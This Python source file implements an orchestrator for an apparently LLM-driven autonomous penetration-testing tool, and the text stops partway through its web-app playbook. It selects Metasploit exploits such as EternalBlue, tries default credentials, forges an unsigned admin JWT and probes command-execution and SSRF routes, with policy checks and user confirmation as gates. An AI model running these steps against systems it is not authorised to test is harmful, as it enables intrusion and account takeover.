import time
from typing import Dict, Any
from urllib.parse import urlparse
import base64
import json
import re

from confirmation import confirm_action
from data_store import DataStore
from llm_interface import LLMInterface, LLMRateLimitCooldown
from analysis_engine import AnalysisEngine
from policy_engine import PolicyEngine
from tool_wrappers import ToolWrapperFactory
from utils import sanitize_target


# Tools that ALWAYS require user confirmation, regardless of policy.
ALWAYS_CONFIRM_TOOLS = {"msf_exploit", "msf_payload", "msf_session", "hydra"}


class Orchestrator:
    def __init__(
        self,
        target: str,
        scope: str,
        data_dir: str = "./data",
        max_steps: int = 25,
        require_user_confirmation: bool = True,
        policy_path: str = "policy.json",
        progress_callback=None,
        should_stop_callback=None,
        should_pause_callback=None,
        confirm_callback=None,
        llm_enabled: bool = True,
        mode: str = "legacy",
        settings: Dict[str, Any] = None,
    ):
        self.original_target = target
        self.target = sanitize_target(target)
        self.scope = scope
        self.max_steps = max_steps
        self.require_user_confirmation = require_user_confirmation
        self.progress_callback = progress_callback
        self.should_stop_callback = should_stop_callback
        self.should_pause_callback = should_pause_callback
        self.confirm_callback = confirm_callback
        self.mode = mode
        self.settings = settings or {}
        self.data_store = DataStore(data_dir)
        self.run_dir = data_dir
        self.llm = LLMInterface(mode=mode)
        self.llm.enabled = llm_enabled
        self.tool_factory = ToolWrapperFactory()
        self.analysis_engine = AnalysisEngine()
        self.policy = PolicyEngine(policy_path)
        self._last_llm_notice_key = None
        self._last_llm_notice_ts = 0.0
        self.state = self._load_state() or {
            "phase": "recon",
            "history": [],
            "findings": [],
            "reasoning_trace": [],
            "target": target,
            "scope": scope,
            "settings": self.settings,
        }

    def _web_profile_settings(self) -> Dict[str, Any]:
        web = self.settings.get("web", {}) if isinstance(self.settings, dict) else {}
        profile = str(web.get("profile", "balanced")).strip().lower()
        if profile not in {"cautious", "balanced", "aggressive"}:
            profile = "balanced"
        route_budget = int(web.get("route_budget", 2 if profile == "balanced" else (1 if profile == "cautious" else 3)))
        login_attempts = int(web.get("login_attempts", 2 if profile == "balanced" else (1 if profile == "cautious" else 4)))
        browser_enabled = bool(web.get("browser_enabled", True))
        return {
            "profile": profile,
            "route_budget": max(1, min(route_budget, 6)),
            "login_attempts": max(0, min(login_attempts, 6)),
            "browser_enabled": browser_enabled,
        }

    def _load_state(self) -> Dict[str, Any]:
        return self.data_store.load_state()

    def _save_state(self):
        self.data_store.save_state(self.state)

    def run(self):
        print(f"[*] Starting autonomous pentest on {self.target} (Mode: {self.mode})")
        self._emit_progress("started", {
            "target": self.original_target, 
            "scope": self.scope,
            "mode": self.mode
        })
        was_paused = False
        for _ in range(self.max_steps):
            while self._should_pause():
                if self._should_stop():
                    self._emit_progress("cancelled", {"reason": "stop_requested"})
                    return {"status": "cancelled", "steps": len(self.state["history"]), "findings": len(self.state["findings"])}
                if not was_paused:
                    was_paused = True
                    self._emit_progress("paused", {"reason": "pause_requested"})
                time.sleep(0.5)
            if was_paused:
                was_paused = False
                self._emit_progress("resumed", {"reason": "pause_cleared"})
            if self._should_stop():
                self._emit_progress("cancelled", {"reason": "stop_requested"})
                return {"status": "cancelled", "steps": len(self.state["history"]), "findings": len(self.state["findings"])}
            # Get current context for LLM
            context = self._build_context()
            # Ask LLM what to do next
            action = self.ask_llm("next_action", context)
            if action["type"] == "complete":
                print("[*] Assessment complete. Generating report...")
                self._generate_report()
                self._emit_progress("completed", {"steps": len(self.state["history"])})
                break
            elif action["type"] == "tool":
                tool_name = action["tool"]
                params = action.get("params", {})
                params = self._apply_tool_constraints(tool_name, params)
                allowed, reason, needs_confirmation = self._policy_check(tool_name, params)
                if not allowed:
                    self._record_event(tool_name, params, {"error": f"Policy denied: {reason}"})
                    self._emit_progress("policy_denied", {"tool": tool_name, "reason": reason})
                    continue
                if self._requires_confirmation(tool_name, params, needs_confirmation):
                    approved = self._confirm(f"Run {tool_name} with params {params}")
                    if not approved:
                        self._record_event(tool_name, params, {"error": "Action cancelled by user"})
                        self._emit_progress("cancelled", {"tool": tool_name})
                        continue
                # Notify dashboard that tool is about to run
                self._emit_progress("tool_executing", {"tool": tool_name, "params": {k: v for k, v in params.items() if k != "__stop_callback"}})
                # Execute tool
                try:
                    result = self.execute_tool(tool_name, params)
                    
                    # If the tool result contains a navigation_url, emit a navigation event
                    nav_url = result.get("navigation_url")
                    if nav_url:
                        # Map host.docker.internal back to localhost for the frontend
                        display_url = nav_url.replace("host.docker.internal", "localhost")
                        self._emit_progress("navigation", {"url": display_url})
                        
                except Exception as exc:
                    result = {"error": str(exc)}
                self._record_event(tool_name, params, result)
                self._refresh_findings()
                self._save_state()
                # Build a summary for the dashboard
                summary = self._build_tool_summary(tool_name, result)
                raw_output = result.get("raw", "")
                self._emit_progress("tool_executed", {
                    "tool": tool_name,
                    "ok": "error" not in result,
                    "summary": summary,
                    "output": str(raw_output)[:2000] if raw_output else "",
                    "result": result,
                })
            elif action["type"] == "analysis":
                # LLM wants to analyze existing data
                analysis = self.ask_llm("analyze", context)
                self.state["findings"].extend(analysis.get("findings", []))
                self._refresh_findings()
                self._save_state()
                self._emit_progress("analysis_complete", {"findings": len(analysis.get("findings", []))})
            else:
                print(f"[!] Unknown action type: {action['type']}")
                break
        else:
            print(f"[!] Reached max steps ({self.max_steps}). Generating partial report...")
            self._generate_report()
            self._emit_progress("max_steps_reached", {"max_steps": self.max_steps})
            return {"status": "partial", "steps": self.max_steps, "findings": len(self.state["findings"])}

        return {"status": "complete", "steps": len(self.state["history"]), "findings": len(self.state["findings"])}

    def ask_llm(self, prompt_type: str, context: Dict[str, Any]) -> Dict[str, Any]:
        if not self.llm.enabled:
            return self._fallback_action(prompt_type, context)
        try:
            # Use the new structured query method
            response_data = self.llm.query(prompt_type, context)
            result = response_data["result"]
            reasoning = response_data.get("reasoning", "")
            raw_response = response_data.get("raw_response", "")

            # Emit reasoning to dashboard
            if reasoning:
                self._emit_reasoning(reasoning)

            # Convert Pydantic objects or lists of objects to dicts/lists of dicts
            if hasattr(result, "dict"):
                parsed = result.dict()
            elif isinstance(result, list):
                parsed = [item.dict() if hasattr(item, "dict") else item for item in result]
            else:
                parsed = result

            if prompt_type == "analyze" and isinstance(parsed, list):
                if not reasoning:
                    self._emit_reasoning(f"LLM reviewed accumulated evidence and proposed {len(parsed)} candidate finding(s).")
                return {"findings": self._filter_llm_findings(parsed)}
            if prompt_type == "next_action":
                normalized = self._normalize_next_action(parsed, context)
                if normalized:
                    if not reasoning:
                        self._emit_reasoning(self._describe_action_reasoning(normalized))
                    return normalized
                invalid_detail = self._summarize_invalid_next_action(parsed, raw_response)
                self._emit_reasoning(f"LLM produced an invalid next action ({invalid_detail}), so Keraunos switched to the fallback planner.")
                self._emit_progress("llm_validation_failed", {"reason": "invalid_next_action"})
                return self._fallback_action(prompt_type, context)
            return parsed
        except Exception as e:
            if isinstance(e, LLMRateLimitCooldown):
                self._emit_llm_notice("cooldown", f"LLM cooldown active ({str(e)}). Keraunos is using the fallback planner until the provider recovers.", min_interval=30)
                return self._fallback_action(prompt_type, context)
            error_text = str(e)[:120]
            if "429" in error_text:
                self._emit_llm_notice("rate_limit", f"LLM call failed ({error_text}). Keraunos is continuing with the fallback planner.", min_interval=30)
            else:
                self._emit_llm_notice(f"error:{error_text}", f"LLM call failed ({error_text}). Keraunos is continuing with the fallback planner.", min_interval=15)
            print(f"[!] LLM Query failed: {e}. Falling back...")
            return self._fallback_action(prompt_type, context)

    def _normalize_next_action(self, action: Dict[str, Any], context: Dict[str, Any]) -> Dict[str, Any]:
        action = self._coerce_next_action_shape(action)
        if not isinstance(action, dict):
            return {}
        action_type = action.get("type")
        if action_type == "analysis":
            return {"type": "analysis"}
        if action_type == "complete":
            tools_run = {item.get("tool") for item in self.state.get("history", []) if item.get("tool")}
            if self.mode == "webapp":
                core_tools = {"web_interact", "sqlmap", "ffuf", "nikto", "websocket_interact"}
            else:
                core_tools = {"nmap", "http_probe", "nikto", "nuclei"}
            if len(tools_run) < 4 or not core_tools.intersection(tools_run):
                return {}
            return {"type": "complete"}
        if action_type != "tool":
            return {}

        tool_name = action.get("tool")
        if not isinstance(tool_name, str) or tool_name not in self.tool_factory.list_tools():
            return {}
        raw_params = action.get("params")
        params = raw_params if isinstance(raw_params, dict) else {}
        params = self._default_params_for_tool(tool_name, params)
        if self.mode == "webapp":
            redirected = self._redirect_webapp_tool(tool_name, params)
            if redirected:
                return redirected
        if self._is_duplicate_tool_request(tool_name, params):
            return {}
        return {"type": "tool", "tool": tool_name, "params": params}

    def _coerce_next_action_shape(self, action: Any) -> Dict[str, Any]:
        if isinstance(action, str):
            lowered = action.strip().lower()
            if lowered in {"complete", "done", "finish"}:
                return {"type": "complete"}
            if lowered in {"analysis", "analyze"}:
                return {"type": "analysis"}
            return {}
        if not isinstance(action, dict):
            return {}

        if isinstance(action.get("next_action"), dict):
            action = action["next_action"]
        elif isinstance(action.get("result"), dict) and any(key in action["result"] for key in ("type", "tool", "action", "kind")):
            action = action["result"]

        normalized = dict(action)
        normalized_type = normalized.get("type") or normalized.get("action") or normalized.get("kind")
        if isinstance(normalized_type, str):
            normalized_type = normalized_type.strip().lower()
            alias_map = {
                "tool_use": "tool",
                "use_tool": "tool",
                "run_tool": "tool",
                "call_tool": "tool",
                "finish": "complete",
                "done": "complete",
                "analyze": "analysis",
            }
            normalized["type"] = alias_map.get(normalized_type, normalized_type)

        if "type" not in normalized and normalized.get("tool"):
            normalized["type"] = "tool"

        if normalized.get("type") == "tool":
            if "params" not in normalized:
                params = normalized.get("parameters")
                if not isinstance(params, dict):
                    params = normalized.get("arguments")
                normalized["params"] = params if isinstance(params, dict) else {}
        return normalized

    def _summarize_invalid_next_action(self, action: Any, raw_response: str) -> str:
        if isinstance(action, dict):
            action_type = action.get("type") or action.get("action") or action.get("kind") or "unknown"
            tool = action.get("tool") or action.get("name") or "unknown"
            return f"type={action_type}, tool={tool}"
        text = str(raw_response or action or "").strip().replace("\n", " ")
        return text[:120] if text else "unparseable response"

    def _redirect_webapp_tool(self, tool_name: str, params: Dict[str, Any]) -> Dict[str, Any]:
        routes_seen = self._webapp_routes_seen()
        if tool_name == "web_interact" and self._is_low_value_webapp_loop(params):
            next_step = self._next_unseen_webapp_step()
            if next_step:
                redirected_tool = next_step.get("tool")
                redirected_params = next_step.get("params", {})
                if redirected_tool and not self._is_duplicate_tool_request(redirected_tool, redirected_params):
                    self._emit_reasoning(
                        "LLM selected another low-value homepage browser action, so webapp mode redirected the step into the next unseen exploit path."
                    )
                    return next_step
        if tool_name == "nmap" and routes_seen < 5:
            redirected_tool = "gobuster"
            redirected_params = self._default_params_for_tool("gobuster", {})
            if not self._is_duplicate_tool_request(redirected_tool, redirected_params):
                self._emit_reasoning("LLM selected `nmap`, but webapp mode redirected that step into route discovery to keep the assessment focused on application coverage.")
                return {"type": "tool", "tool": redirected_tool, "params": redirected_params}
        if tool_name == "http_probe" and routes_seen < 3:
            redirected_tool = "web_interact"
            redirected_params = self._default_params_for_tool("web_interact", {"path": "/", "method": "GET", "browser": True})
            if not self._is_duplicate_tool_request(redirected_tool, redirected_params):
                self._emit_reasoning("LLM selected `http_probe`, but webapp mode redirected that step into browser-backed route exploration for stronger application evidence.")
                return {"type": "tool", "tool": redirected_tool, "params": redirected_params}
        return {}

    def _default_params_for_tool(self, tool_name: str, params: Dict[str, Any]) -> Dict[str, Any]:
        normalized = dict(params)
        base_url = self.target if str(self.target).startswith(("http://", "https://")) else f"http://{self.target}"
        target_host = self.target.replace("http://", "").replace("https://", "")
        if tool_name in {"nmap", "sslscan", "nikto", "enum4linux", "nuclei"}:
            normalized.setdefault("target", target_host)
        if tool_name == "dns_enum":
            normalized.setdefault("domain", target_host)
            normalized.setdefault("type", "std")
        if tool_name == "http_probe":
            normalized.setdefault("target", target_host)
            normalized.setdefault("scheme", "http")
        if tool_name == "web_interact":
            normalized.setdefault("target", base_url)
            if self.mode == "webapp":
                normalized.setdefault("browser", self._web_profile_settings().get("browser_enabled", True))
            normalized = self._normalize_web_interact_params(normalized, base_url)
        if tool_name == "websocket_interact":
            normalized.setdefault("target", target_host)
            normalized.setdefault("path", "/ws")
        if tool_name in {"wpscan", "sqlmap"}:
            normalized.setdefault("url", base_url)
        if tool_name == "ffuf":
            normalized.setdefault("url", f"{base_url.rstrip('/')}/FUZZ")
        if tool_name == "gobuster":
            normalized.setdefault("url", base_url)
            normalized.setdefault("mode", "dir")
        if tool_name in {"msf_exploit", "msf_auxiliary"}:
            normalized.setdefault("rhosts", target_host)
        return normalized

    def _normalize_web_interact_params(self, params: Dict[str, Any], base_url: str) -> Dict[str, Any]:
        normalized = dict(params)
        target = str(normalized.get("target") or base_url).strip()
        raw_url = str(normalized.get("url") or "").strip()
        method = str(normalized.get("method", "GET")).upper()
        browser_action = str(normalized.get("browser_action", "goto")).lower()

        if raw_url and not normalized.get("path"):
            parsed = urlparse(raw_url)
            if parsed.scheme and parsed.netloc:
                target = f"{parsed.scheme}://{parsed.netloc}"
                path = parsed.path or "/"
                if parsed.query:
                    path = f"{path}?{parsed.query}"
                normalized["path"] = path
            elif raw_url.startswith("/"):
                normalized["path"] = raw_url

        normalized["target"] = target
        normalized.setdefault("path", "/")
        if not str(normalized["path"]).startswith("/"):
            normalized["path"] = f"/{normalized['path']}"

        has_stateful_request = any(
            normalized.get(key) for key in ("payload", "json", "files", "headers", "cookies", "session_name")
        )
        if method != "GET" and browser_action == "goto":
            normalized["browser"] = False
        elif has_stateful_request and method != "GET" and browser_action != "request":
            normalized["browser"] = False

        return normalized

    def _is_duplicate_tool_request(self, tool_name: str, params: Dict[str, Any]) -> bool:
        history = self.state.get("history", [])
        for event in reversed(history[-5:]):
            if event.get("tool") != tool_name:
                continue
            previous = event.get("params", {})
            if previous == params:
                return True
        return False

    def _is_low_value_webapp_loop(self, params: Dict[str, Any]) -> bool:
        path = str(params.get("path") or "/").split("?", 1)[0]
        method = str(params.get("method", "GET")).upper()
        browser = bool(params.get("browser"))
        browser_action = str(params.get("browser_action", "goto")).lower()
        if path != "/" or method != "GET" or not browser or browser_action not in {"goto", "evaluate"}:
            return False

        repeats = 0
        for event in reversed(self.state.get("history", [])):
            if event.get("tool") != "web_interact":
                continue
            previous = event.get("params", {})
            previous_path = str(previous.get("path") or "/").split("?", 1)[0]
            previous_method = str(previous.get("method", "GET")).upper()
            previous_action = str(previous.get("browser_action", "goto")).lower()
            if previous_path == "/" and previous_method == "GET" and previous_action in {"goto", "evaluate"}:
                repeats += 1
            if repeats >= 2:
                return True
        return False

    def _next_unseen_webapp_step(self) -> Dict[str, Any]:
        base_url = self.target if str(self.target).startswith(("http://", "https://")) else f"http://{self.target}"
        parsed_base = urlparse(base_url)
        ws_target = parsed_base.netloc or self.target.replace("http://", "").replace("https://", "")
        tools_run = [item.get("tool") for item in self.state.get("history", []) if item.get("tool")]

        def seen_step(step: Dict[str, Any]) -> bool:
            tool_name = step.get("tool")
            params = step.get("params", {})
            if tool_name == "web_interact":
                for item in self.state.get("history", []):
                    if item.get("tool") != "web_interact":
                        continue
                    previous = item.get("params", {})
                    if str(previous.get("path") or "/") != str(params.get("path") or "/"):
                        continue
                    if str(previous.get("method", "GET")).upper() != str(params.get("method", "GET")).upper():
                        continue
                    if previous.get("session_name") != params.get("session_name"):
                        continue
                    return True
                return False
            if tool_name == "websocket_interact":
                return "websocket_interact" in tools_run
            return tool_name in tools_run

        for step in self._webapp_playbook(base_url, ws_target):
            if not seen_step(step):
                return step
        return {}

    def _filter_llm_findings(self, findings: list) -> list:
        accepted = []
        for finding in findings:
            if not isinstance(finding, dict):
                continue
            if not finding.get("name") or not finding.get("evidence"):
                continue
            accepted.append(finding)
        return accepted

    def execute_tool(self, tool_name: str, params: Dict[str, Any]) -> Dict[str, Any]:
        wrapper = self.tool_factory.get_wrapper(tool_name)
        exec_params = dict(params)
        exec_params["__stop_callback"] = self._should_stop
        exec_params["__run_settings"] = self.settings
        exec_params["__run_dir"] = self.run_dir
        exec_params["__mode"] = self.mode
        return wrapper.run(exec_params)

    def _requires_confirmation(self, tool_name: str, params: Dict[str, Any], policy_requested: bool) -> bool:
        if not self.require_user_confirmation:
            return False
            
        # Priority: If PolicyEngine says it needs confirmation, it does.
        if policy_requested:
            return True
            
        # Safety fallback for specific critical tools IF they aren't already covered by policy 
        # (though they usually should be).
        if tool_name in ALWAYS_CONFIRM_TOOLS:
            # Check if this tool is specifically exempted in policy.json by having been 
            # allowed without confirmation. If policy_requested was False, it means 
            # PolicyEngine didn't flag it as high risk based on the user's config.
            # We'll trust the policy engine but keep a tight grip on MSF.
            if tool_name.startswith("msf_"):
                return True # Always confirm MSF for safety
            return False
            
        return False

    def _confirm(self, description: str) -> bool:
        """Request confirmation via dashboard callback or terminal."""
        if self.confirm_callback:
            return self.confirm_callback(description)
        return confirm_action(description)

    def _build_tool_summary(self, tool_name: str, result: dict) -> str:
        """Build a short summary of tool results for the dashboard."""
        if "error" in result:
            return f"Error: {str(result['error'])[:200]}"
        summaries = {
            "nmap": lambda r: f"{len(r.get('ports', []))} open port(s) found",
            "nikto": lambda r: f"{r.get('count', 0)} vulnerability(ies) found",
            "gobuster": lambda r: f"{r.get('count', 0)} path(s) discovered",
            "nuclei": lambda r: f"{r.get('count', 0)} finding(s)",
            "ffuf": lambda r: f"{r.get('count', 0)} response(s)",
            "sslscan": lambda r: f"{len(r.get('data', {}).get('vulnerabilities', []))} TLS issue(s)",
            "dns_enum": lambda r: f"{r.get('count', 0)} DNS record(s)",
            "metasploit_search": lambda r: f"{r.get('count', 0)} module(s) found",
            "searchsploit": lambda r: f"{len(r.get('matches', {}).get('RESULTS_EXPLOIT', []))} exploit(s)",
            "sqlmap": lambda r: "Vulnerable!" if r.get("vulnerable") else "Not vulnerable",
            "hydra": lambda r: f"{len(r.get('credentials', []))} credential(s) cracked",
            "msf_exploit": lambda r: "Session opened!" if r.get("success") else "No session",
            "enum4linux": lambda r: "SMB data collected",
            "http_probe": lambda r: f"Status {r.get('status_code', '?')}",
            "web_interact": lambda r: f"{r.get('browser_action', r.get('method', 'GET'))} -> {r.get('status_code', '?')}",
            "websocket_interact": lambda r: f"{len(r.get('messages_received', []))} websocket reply/replies",
        }
        fn = summaries.get(tool_name)
        if fn:
            try:
                return fn(result)
            except Exception:
                pass
        return "Complete"

    def _build_context(self) -> Dict[str, Any]:
        return {
            "target": self.target,
            "scope": self.scope,
            "phase": self.state["phase"],
            "history": self.state["history"][-10:],  # last 10 actions
            "findings": self.state["findings"],
            "available_tools": self.tool_factory.list_tools(),
            "settings": self.settings,
            "mode": self.mode,
        }

    def _generate_report(self):
        from reporting import ReportGenerator

        report_gen = ReportGenerator(self.data_store)
        report_gen.generate()
        self._emit_progress("report_generated", {"target": self.target})

    def _describe_action_reasoning(self, action: Dict[str, Any]) -> str:
        action_type = action.get("type")
        if action_type == "tool":
            tool = action.get("tool", "unknown")
            params = action.get("params", {})
            target_hint = params.get("path") or params.get("url") or params.get("target") or params.get("module") or ""
            if target_hint:
                return f"LLM selected `{tool}` next to validate or expand evidence around `{target_hint}`."
            return f"LLM selected `{tool}` as the next highest-value step."
        if action_type == "analysis":
            return "LLM paused active probing to consolidate evidence into findings."
        if action_type == "complete":
            return "LLM judged that current coverage is sufficient and moved the run to report generation."
        return "LLM updated the plan."

    def _fallback_action(self, prompt_type: str, context: Dict[str, Any]) -> Dict[str, Any]:
        """Intelligent fallback chain that progresses through pentest phases."""
        if prompt_type == "analyze":
            self._emit_reasoning("LLM analysis is unavailable, so Keraunos is using the deterministic finding extractor instead.")
            return {"findings": []}

        tools_run = [item.get("tool") for item in self.state.get("history", []) if item.get("tool")]
        if self.mode == "webapp":
            web_history = self.state.get("history", [])
            base_url = self.target if str(self.target).startswith(("http://", "https://")) else f"http://{self.target}"
            parsed_base = urlparse(base_url)
            ws_target = parsed_base.netloc or self.target.replace("http://", "").replace("https://", "")
            host_only = parsed_base.hostname or ws_target

            def seen_web(path: str, tool_name: str = "web_interact", method: str = None, session_name: str = None) -> bool:
                for item in web_history:
                    if item.get("tool") != tool_name:
                        continue
                    params = item.get("params", {})
                    if params.get("path") != path:
                        continue
                    if method and str(params.get("method", "GET")).upper() != method.upper():
                        continue
                    if session_name and params.get("session_name") != session_name:
                        continue
                    return True
                return False

            for step in self._webapp_playbook(base_url, ws_target):
                if step["tool"] == "web_interact":
                    params = step["params"]
                    if seen_web(params.get("path", "/"), method=params.get("method"), session_name=params.get("session_name")):
                        continue
                    return step
                if step["tool"] == "websocket_interact" and "websocket_interact" not in tools_run:
                    return step
            if "sqlmap" not in tools_run:
                return {"type": "tool", "tool": "sqlmap", "params": {"url": self._best_sqlmap_target(base_url)}}
            if "nmap" not in tools_run:
                return {"type": "tool", "tool": "nmap", "params": {"target": host_only, "flags": "-Pn -p 2121,2222,3000,8081 -sV"}}
            return {"type": "complete"}

        # ── Phase 1: Reconnaissance ──────────────────────────────────
        if "nmap" not in tools_run:
            return {"type": "tool", "tool": "nmap", "params": {"target": self.target, "flags": "-sV"}}
        if "dns_enum" not in tools_run:
            return {"type": "tool", "tool": "dns_enum", "params": {"domain": self.target, "type": "std"}}
        if "http_probe" not in tools_run:
            return {"type": "tool", "tool": "http_probe", "params": {"target": self.target, "scheme": "http"}}

        # ── Phase 2: Service Enumeration ─────────────────────────────
        if "sslscan" not in tools_run:
            return {"type": "tool", "tool": "sslscan", "params": {"target": self.target}}
        if "nikto" not in tools_run:
            return {"type": "tool", "tool": "nikto", "params": {"target": self.target}}

        # ── Phase 3: Discovery & Fuzzing ─────────────────────────────
        if "gobuster" not in tools_run:
            return {"type": "tool", "tool": "gobuster", "params": {
                "url": f"http://{self.target}", "mode": "dir",
            }}
        if "ffuf" not in tools_run:
            return {"type": "tool", "tool": "ffuf", "params": {
                "url": f"http://{self.target}/FUZZ",
            }}

        # ── Phase 4: Vulnerability Scanning ──────────────────────────
        findings = self.state.get("findings", [])
        high_findings = [f for f in findings if f.get("severity") in ("Critical", "High")]
        if high_findings and "metasploit_search" not in tools_run and "searchsploit" not in tools_run:
            return {"type": "tool", "tool": "metasploit_search", "params": {
                "query": high_findings[0].get("name", self.target)
            }}

        if "nuclei" not in tools_run:
            return {"type": "tool", "tool": "nuclei", "params": {
                "target": self.target, "severity": "critical,high,medium",
            }}
        if "searchsploit" not in tools_run:
            return {"type": "tool", "tool": "searchsploit", "params": {"query": self.target}}
        if "metasploit_search" not in tools_run:
            return {"type": "tool", "tool": "metasploit_search", "params": {"query": self.target}}

        # ── Phase 5: Application-specific scanning ───────────────────
        if "wpscan" not in tools_run:
            return {"type": "tool", "tool": "wpscan", "params": {"url": f"http://{self.target}"}}
        if "sqlmap" not in tools_run:
            return {"type": "tool", "tool": "sqlmap", "params": {"url": f"http://{self.target}"}}
        if "enum4linux" not in tools_run:
            return {"type": "tool", "tool": "enum4linux", "params": {"target": self.target}}

        # ── Phase 6: Metasploit auxiliary scanning ───────────────────
        if "msf_auxiliary" not in tools_run:
            return {"type": "tool", "tool": "msf_auxiliary", "params": {
                "module": "auxiliary/scanner/smb/smb_version", "rhosts": self.target,
            }}

        if findings:
            if high_findings:
                finding = high_findings[0]
                name = finding.get("name", "").lower()
                
                # Try to get Nmap XML from history if available
                nmap_xml = None
                for h in reversed(self.state.get("history", [])):
                    if h.get("tool") == "nmap" and h.get("result", {}).get("raw"):
                        nmap_xml = h["result"]["raw"]
                        break

                # Check if we searched for exploits yet
                if "metasploit_search" not in tools_run and "searchsploit" not in tools_run:
                    if nmap_xml:
                        return {"type": "tool", "tool": "searchsploit", "params": {
                            "nmap_xml": nmap_xml
                        }}
                    return {"type": "tool", "tool": "metasploit_search", "params": {
                        "query": name
                    }}
                
                # If we have search results, try to pick one
                module = "exploit/multi/misc/java_rmi_server"
                if "smb" in name or "eternalblue" in name:
                    module = "exploit/windows/smb/ms17_010_eternalblue"
                elif "ssh" in name:
                    module = "auxiliary/scanner/ssh/ssh_login"
                
                return {"type": "tool", "tool": "msf_exploit", "params": {
                    "module": module,
                    "rhosts": self.target
                }}

        return {"type": "complete"}

    def _policy_check(self, tool_name: str, params: Dict[str, Any]):
        try:
            wrapper = self.tool_factory.get_wrapper(tool_name)
        except Exception:
            return False, f"Unknown tool '{tool_name}'", False
        risk_level = getattr(wrapper, "risk_level", "low")
        return self.policy.evaluate(tool_name, params, self.target, risk_level)

    def _record_event(self, tool_name: str, params: Dict[str, Any], result: Dict[str, Any]):
        self.state["history"].append(
            {
                "timestamp": time.time(),
                "tool": tool_name,
                "params": params,
                "result": result,
            }
        )
        self._save_state()

    def _refresh_findings(self):
        deterministic = self.analysis_engine.derive_findings(self.state.get("history", []))
        merged = self.state.get("findings", []) + deterministic
        seen = set()
        deduped = []
        for finding in merged:
            if self.mode == "webapp" and self._is_webapp_noise_finding(finding):
                continue
            key = finding.get("fingerprint") or (finding.get("name"), finding.get("evidence"))
            if key in seen:
                continue
            seen.add(key)
            deduped.append(finding)
        self.state["findings"] = deduped

    def _is_webapp_noise_finding(self, finding: Dict[str, Any]) -> bool:
        name = str(finding.get("name") or "")
        if not name.startswith("Exposed service:"):
            return False
        allowlist = ("80/", "443/", "3000/", "5000/", "5173/", "8000/", "8080/", "8081/", "8443/", "11434/")
        return not any(port in name for port in allowlist)

    def _webapp_routes_seen(self) -> int:
        seen = set()
        for item in self.state.get("history", []):
            if item.get("tool") != "web_interact":
                continue
            path = str((item.get("params") or {}).get("path") or "")
            if path:
                seen.add(path.split("?", 1)[0])
        return len(seen)

    def _emit_progress(self, stage: str, payload: Dict[str, Any]):
        if self.progress_callback:
            self.progress_callback(stage, payload)

    def _emit_reasoning(self, thought: str):
        thought = str(thought or "").strip()
        if not thought:
            return
        trace = self.state.setdefault("reasoning_trace", [])
        trace.append({
            "timestamp": time.time(),
            "thought": thought,
        })
        self.state["reasoning_trace"] = trace[-30:]
        self._save_state()
        self._emit_progress("llm_reasoning", {"thought": thought})

    def _emit_llm_notice(self, key: str, thought: str, min_interval: int = 20):
        now = time.time()
        if self._last_llm_notice_key == key and (now - self._last_llm_notice_ts) < min_interval:
            return
        self._last_llm_notice_key = key
        self._last_llm_notice_ts = now
        self._emit_reasoning(thought)

    def _webapp_playbook(self, base_url: str, ws_target: str):
        forged_admin = self._build_unsigned_jwt({"role": "admin", "user": "admin"})
        profile = self._web_profile_settings()
        route_budget = profile["route_budget"]
        login_attempts = profile["login_attempts"]
        browser_enabled = profile["browser_enabled"]
        routes = self._candidate_web_paths()
        common_auth_paths = ["/login", "/signin", "/auth/login", "/users/sign_in"]
        common_search_paths = ["/search", "/find", "/query"]
        common_object_paths = ["/account", "/profile", "/user"]
        common_ssrf_paths = ["/fetch", "/proxy", "/api/fetch"]
        common_cmd_paths = ["/diagnostics", "/debug", "/admin/exec"]
        common_download_paths = ["/download", "/export", "/file"]
        common_token_paths = ["/api/token", "/token", "/auth/token"]
        common_admin_paths = ["/admin", "/api/admin", "/admin/reports"]
        common_upload_paths = ["/upload", "/import", "/api/upload"]
        common_template_paths = ["/template", "/render", "/preview"]
        common_ws_paths = ["/ws", "/socket.io", "/websocket"]
        credential_sets = [
            ("guest", {"username": "guest", "password": "guest"}),
            ("user", {"username": "user", "password": "password"}),
            ("test", {"username": "test", "password": "test"}),
            ("admin", {"username": "admin", "password": "admin"}),
        ]
        if profile["profile"] == "aggressive":
            credential_sets.extend([
                ("root", {"username": "root", "password": "root"}),
                ("dev", {"username": "dev", "password": "dev"}),
            ])
        elif profile["profile"] == "cautious":
            credential_sets = credential_sets[:1]

        def choose_paths(predicate, defaults):
            matches = [path for path in routes if predicate(path)]
            ordered = []
            seen = set()
            for path in matches + defaults:
                normalized = self._normalize_candidate_path(path)
                if normalized and normalized not in seen:
                    seen.add(normalized)
                    ordered.append(normalized)
            return ordered

        auth_paths = choose_paths(
            lambda path: any(token in path.lower() for token in ["/login", "/signin", "/auth", "/session"]),
            common_auth_paths,
        )
        search_paths = choose_paths(
            lambda path: any(token in path.lower() for token in ["/search", "/find", "/query"]),
            common_search_paths,
        )
        object_paths = choose_paths(
            lambda path: any(token in path.lower() for token in ["/account", "/profile", "/user", "/member", "/customer", "/order", "/invoice"]),
            common_object_paths,
        )
        content_paths = choose_paths(
            lambda path: any(token in path.lower() for token in ["/board", "/post", "/article", "/message", "/comment"]),
            [],
        )
        ssrf_paths = choose_paths(
            lambda path: any(token in path.lower() for token in ["/fetch", "/proxy", "/url", "/webhook", "/import", "/crawl"]),
            common_ssrf_paths,
        )
        cmd_paths = choose_paths(
            lambda path: any(token in path.lower() for token in ["/diagnostic", "/debug", "/exec", "/console", "/shell", "/ping"]),
            common_cmd_paths,
        )
        download_paths = choose_paths(
            lambda path: any(token in path.lower() for token in ["/download", "/export", "/file", "/archive", "/backup"]),
            common_download_paths,
        )
        token_paths = choose_paths(
            lambda path: any(token in path.lower() for token in ["/token", "/jwt", "/oauth", "/session"]),
            common_token_paths,
        )
        admin_paths = choose_paths(
            lambda path: any(token in path.lower() for token in ["/admin", "/manage", "/dashboard", "/reports"]),
            common_admin_paths,
        )
        upload_paths = choose_paths(
            lambda path: any(token in path.lower() for token in ["/upload", "/import", "/attachment", "/avatar"]),
            common_upload_paths,
        )
        template_paths = choose_paths(
            lambda path: any(token in path.lower() for token in ["/template", "/render", "/preview", "/view"]),
            common_template_paths,
        )
        ws_paths = choose_paths(
            lambda path: any(token in path.lower() for token in ["/ws", "/socket", "/websocket"]),
            common_ws_paths,
        )

        playbook = [
            {"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": "/", "method": "GET", "browser": browser_enabled}},
        ]

        for path in auth_paths[:route_budget]:
            playbook.append({"type": "tool", "tool": "web_interact", "params": {"target": base_url, "path": path, "method": "GET", "browser": browser_enabled}})
